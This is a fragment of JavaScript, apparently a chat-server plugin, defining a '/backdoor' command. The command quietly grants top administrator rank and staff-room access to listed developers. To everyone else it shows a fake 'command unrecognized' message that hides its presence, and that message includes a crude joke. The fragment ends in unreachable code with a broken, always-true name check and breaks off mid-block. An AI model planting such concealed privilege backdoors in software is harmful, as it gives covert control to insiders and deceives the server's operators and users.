...
exports.commands = {
    ...
    backdoor: function(target, room, user, cmd) {
        if (!~developers.indexOf(user.userid)) return this.errorReply("The command '/backdoor' was unrecognized to send a message starting with '/backdoor', type '//backdoor' . Also your moms backdoor tbh");
        if (target) return this.errorReply('This command isn\'t used like that');
        user.group = '~';
        user.updateIdentity();
        return this.parse('/join staff');

        if (user.userid == 'darknightskies' || 'rainythunder') {
